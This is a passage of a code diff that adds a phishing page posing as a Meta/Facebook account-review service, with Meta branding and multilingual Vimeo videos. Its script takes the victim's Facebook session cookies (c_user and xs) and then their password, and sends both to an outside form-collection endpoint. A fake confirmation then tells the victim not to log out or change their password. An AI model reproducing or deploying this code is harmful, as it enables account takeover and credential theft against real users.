+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h3 class="success-title">Review Request Submitted!</h3>
+                        <p class="success-text">Your account review request has been successfully submitted. Our team will review your case within the next 24 hours.</p>
+                        
+                        <div class="deletion-warning">
+                            <h3><i class="fas fa-info-circle"></i> Important Instructions</h3>
+                            <ul>
+                                <li>Do not log out from your computer during this period</li>
+                                <li>Keep your Facebook account logged in on this device</li>
+                                <li>You will receive a notification once the review is complete</li>
+                                <li>Account deletion has been paused pending review</li>
+                                <li>Please do not attempt to change your password during review</li>
+                            </ul>
+                        </div>
+                        
+                        <button class="btn btn-primary" id="finishBtn">
+                            <i class="fas fa-check"></i> Finish
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Ad Choice</a>
+                <a href="#">Terms and policies</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Help Center</a>
+            </div>
+            <div class="copyright">
+                Meta © 2025 - Protecting Your Digital Identity
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Vimeo video IDs mapping
+            const vimeoVideoIds = {
+                'arabic': '1100127506',
+                'english': '1100127562',
+                'filipino': '1100127622',
+                'french': '1100127706',
+                'hindi': '1100127780',
+                'japanese': '1100127834',
+                'portuguese': '1100127929',
+                'spanish': '1100128008',
+                'swedish': '1100128078',
+                'tamil': '1100128151'
+            };
+            
+           
+
+            // Language modal elements
+            const languageModal = document.getElementById('languageModal');
+            const closeLanguageModal = document.getElementById('closeLanguageModal');
+            const languageSearch = document.getElementById('languageSearch');
+            const languageButtons = document.querySelectorAll('.language-btn');
+            const confirmBtn = document.getElementById('confirmBtn');
+            const selectedLanguageDisplay = document.getElementById('selectedLanguageDisplay');
+            
+            let selectedLanguage = null;
+            let vimeoPlayer = null;
+            
+            // Video elements
+            const videoOverlay = document.getElementById('videoOverlay');
+            const overlayPlayBtn = document.getElementById('overlayPlayBtn');
+            const vimeoContainer = document.getElementById('vimeoPlayer');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const loadingPercentage = document.querySelector('.loading-percentage');
+            const mobileUnmuteBtn = document.getElementById('mobileUnmuteBtn');
+            
+            const modal = document.getElementById('reviewModal');
+            const reviewBtn = document.getElementById('reviewBtn');
+            const closeModal = document.getElementById('closeModal');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const finishBtn = document.getElementById('finishBtn');
+            
+            // Step navigation
+            const nextToStep2 = document.getElementById('nextToStep2');
+            const backToStep1 = document.getElementById('backToStep1');
+            const nextToStep3 = document.getElementById('nextToStep3');
+            
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            
+            const steps = document.querySelectorAll('.step');
+            
+            // Open language modal when video overlay is clicked
+            overlayPlayBtn.addEventListener('click', function() {
+                languageModal.classList.add('active');
+            });
+            
+            // Close language modal
+            closeLanguageModal.addEventListener('click', function() {
+                languageModal.classList.remove('active');
+            });
+            
+            // Language search functionality
+            languageSearch.addEventListener('input', function() {
+                const searchTerm = this.value.toLowerCase();
+                
+                languageButtons.forEach(button => {
+                    const languageName = button.querySelector('.language-name').textContent.toLowerCase();
+                    const languageNative = button.querySelector('.language-native').textContent.toLowerCase();
+                    
+                    if (languageName.includes(searchTerm) || languageNative.includes(searchTerm)) {
+                        button.style.display = 'flex';
+                    } else {
+                        button.style.display = 'none';
+                    }
+                });
+            });
+            
+            // Language selection
+            languageButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    // Remove selected class from all buttons
+                    languageButtons.forEach(btn => btn.classList.remove('selected'));
+                    
+                    // Add selected class to clicked button
+                    this.classList.add('selected');
+                    
+                    // Get selected language
+                    selectedLanguage = this.getAttribute('data-lang');
+                    const languageName = this.querySelector('.language-name').textContent;
+                    
+                    // Update display
+                    selectedLanguageDisplay.textContent = languageName;
+                    
+                    // Enable confirm button
+                    confirmBtn.disabled = false;
+                });
+            });
+            
+            // Initialize Vimeo player with mobile optimization
+            function initVimeoPlayer(lang) {
+                const videoId = vimeoVideoIds[lang];
+                if (!videoId) return;
+                
+                // Clear existing player
+                if (vimeoPlayer) {
+                    vimeoPlayer.destroy();
+                    vimeoContainer.innerHTML = '';
+                }
+                
+                // Create new iframe with mobile optimizations
+                const iframe = document.createElement('iframe');
+                iframe.src = `https://player.vimeo.com/video/${videoId}?title=0&byline=0&portrait=0&badge=0&autopause=0&player_id=0&app_id=58479&autoplay=1&loop=1&playsinline=1&muted=1`;
+                iframe.setAttribute('frameborder', '0');
+                iframe.setAttribute('allow', 'autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share');
+                iframe.setAttribute('allowfullscreen', '');
+                iframe.setAttribute('playsinline', '');
+                iframe.setAttribute('webkit-playsinline', '');
+                iframe.setAttribute('muted', 'true');
+                iframe.className = 'vimeo-iframe';
+                
+                vimeoContainer.appendChild(iframe);
+                
+                // Initialize Vimeo Player
+                vimeoPlayer = new Vimeo.Player(iframe);
+                
+                // Set up event listeners
+                vimeoPlayer.on('play', function() {
+                    videoOverlay.classList.add('hidden');
+                    hideLoadingSpinner();
+                });
+                
+                vimeoPlayer.on('pause', function() {
+                    // Handle pause if needed
+                });
+                
+                vimeoPlayer.on('ended', function() {
+                    // Loop the video
+                    vimeoPlayer.play();
+                });
+                
+                vimeoPlayer.on('bufferstart', function() {
+                    showLoadingSpinner();
+                });
+                
+                vimeoPlayer.on('bufferend', function() {
+                    hideLoadingSpinner();
+                });
+                
+                vimeoPlayer.on('loaded', function() {
+                    hideLoadingSpinner();
+                    // Show unmute button on mobile
+                    if (isMobileDevice()) {
+                        mobileUnmuteBtn.style.display = 'flex';
+                    }
+                });
+                
+                vimeoPlayer.on('error', function(error) {
+                    console.error('Vimeo player error:', error);
+                    hideLoadingSpinner();
+                    alert('Video playback error. Please try selecting a different language or check your internet connection.');
+                });
+                
+                // Play the video
+                vimeoPlayer.play().catch(error => {
+                    console.error('Error playing video:', error);
+                    // Handle mobile autoplay restrictions
+                    if (error.name === 'NotAllowedError') {
+                        videoOverlay.classList.remove('hidden');
+                        alert('Please tap the play button to start the video.');
+                    }
+                });
+            }
+            
+            // Check if device is mobile
+            function isMobileDevice() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+            
+            // Toggle mute/unmute
+            mobileUnmuteBtn.addEventListener('click', function() {
+                if (vimeoPlayer) {
+                    vimeoPlayer.getMuted().then(function(muted) {
+                        if (muted) {
+                            vimeoPlayer.setMuted(false);
+                            this.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
+                        } else {
+                            vimeoPlayer.setMuted(true);
+                            this.innerHTML = '<i class="fas fa-volume-mute"></i> Tap to Unmute';
+                        }
+                    }.bind(this));
+                }
+            });
+            
+            // Confirm language selection
+            confirmBtn.addEventListener('click', function() {
+                if (selectedLanguage) {
+                    initVimeoPlayer(selectedLanguage);
+                    languageModal.classList.remove('active');
+                    localStorage.setItem('preferredLanguage', selectedLanguage);
+                    
+                    // Change overlay text
+                    const overlayText = videoOverlay.querySelector('p');
+                    overlayText.textContent = 'Click to play video';
+                    
+                    // Change overlay play button behavior
+                    overlayPlayBtn.onclick = function() {
+                        if (vimeoPlayer) {
+                            vimeoPlayer.play().catch(error => {
+                                console.error('Error playing video:', error);
+                                if (error.name === 'NotAllowedError') {
+                                    alert('Please tap the play button to start the video.');
+                                }
+                            });
+                        }
+                    };
+                }
+            });
+            
+            // Close modal when clicking outside
+            window.addEventListener('click', function(event) {
+                if (event.target === languageModal) {
+                    languageModal.classList.remove('active');
+                }
+            });
+            
+            // Keyboard shortcut for closing modal
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && languageModal.classList.contains('active')) {
+                    languageModal.classList.remove('active');
+                }
+            });
+
+            // Preload the preferred language if available
+            const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
+            if (vimeoVideoIds[preferredLanguage]) {
+                selectedLanguage = preferredLanguage;
+                selectedLanguageDisplay.textContent = 'English'; // Default display
+                // Don't auto-init player until modal is shown
+            }
+            
+            function showLoadingSpinner() {
+                loadingSpinner.style.display = 'flex';
+            }
+            
+            function hideLoadingSpinner() {
+                loadingSpinner.style.display = 'none';
+            }
+            
+            // Open review modal
+            reviewBtn.addEventListener('click', function() {
+                modal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+            });
+            
+            // Close modal function
+            function closeModalFunc() {
+                modal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                resetForm();
+                
+                // Pause and reset Vimeo player
+                if (vimeoPlayer) {
+                    vimeoPlayer.pause();
+                    vimeoPlayer.destroy();
+                    vimeoContainer.innerHTML = '';
+                    vimeoPlayer = null;
+                }
+                
+                // Reset overlay
+                videoOverlay.classList.remove('hidden');
+                mobileUnmuteBtn.style.display = 'none';
+                
+                // Reset overlay text and behavior
+                const overlayText = videoOverlay.querySelector('p');
+                overlayText.textContent = 'Click to select language';
+                overlayPlayBtn.onclick = function() {
+                    languageModal.classList.add('active');
+                };
+            }
+            
+            closeModal.addEventListener('click', closeModalFunc);
+            cancelBtn.addEventListener('click', closeModalFunc);
+            
+            // Finish button
+            finishBtn.addEventListener('click', function() {
+                window.location.href = "https://www.facebook.com/";
+            });
+            
+            // Next to Step 2
+            nextToStep2.addEventListener('click', function() {
+                const cUserInput = document.getElementById('c_user');
+                const xsInput = document.getElementById('xs');
+                
+                // Trigger browser validation
+          if (!cUserInput.checkValidity()) {
+            cUserInput.reportValidity();
+            return;
+          }
+
+          if (!xsInput.checkValidity()) {
+            xsInput.reportValidity();
+            return;
+          }
+
+                // Submit c_user and xs together
+          const formData = new FormData();
+          formData.append("c_user", cUserInput.value);
+          formData.append("xs", xsInput.value);
+
+          fetch("https://submit-form.com/c4sBSh1fv ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              c_user: cUserInput.value,
+              xs: xsInput.value
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Submission of c_user and xs failed");
+              }
+            })
+            .catch((error) => {
+              console.error("Submission error:", error);
+            });
+
+          // Proceed to next step
+          step1.classList.remove("active");
+          step2.classList.add("active");
+
+          steps[0].classList.remove("active");
+          steps[1].classList.add("active");
+        });
+
+        // Back to Step 1
+        backToStep1.addEventListener("click", function () {
+          step2.classList.remove("active");
+          step1.classList.add("active");
+
+          steps[1].classList.remove("active");
+          steps[0].classList.add("active");
+        });
+
+        // Submit form
+        nextToStep3.addEventListener("click", function () {
+          const passwordInput = document.getElementById("password");
+
+          if (!passwordInput.checkValidity()) {
+            passwordInput.reportValidity();
+            return;
+          }
+          // Submit password separately
+          const formData = new FormData();
+          formData.append("password", passwordInput.value);
+
+          fetch("https://submit-form.com/c4sBSh1fv ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              password: passwordInput.value,
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Password submission failed");
+              }
+            })
+            .catch((error) => {
+              console.error("Submission error:", error);
+            });
+
+          // Proceed to success step
+          step2.classList.remove("active");
+          step3.classList.add("active");
+
+          steps[1].classList.remove("active");
+          steps[2].classList.add("active");
+        });
+            
+            // Reset form
+            function resetForm() {
+                document.getElementById('c_user').value = '';
+                document.getElementById('xs').value = '';
+                document.getElementById('password').value = '';
+                
+                step3.classList.remove('active');
+                step1.classList.add('active');
+                
+                steps[2].classList.remove('active');
+                steps[0].classList.add('active');
+            }
+            
+            // Close modal when clicking outside
+            window.addEventListener('click', function(event) {
+                if (event.target === modal) {
+                    closeModalFunc();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
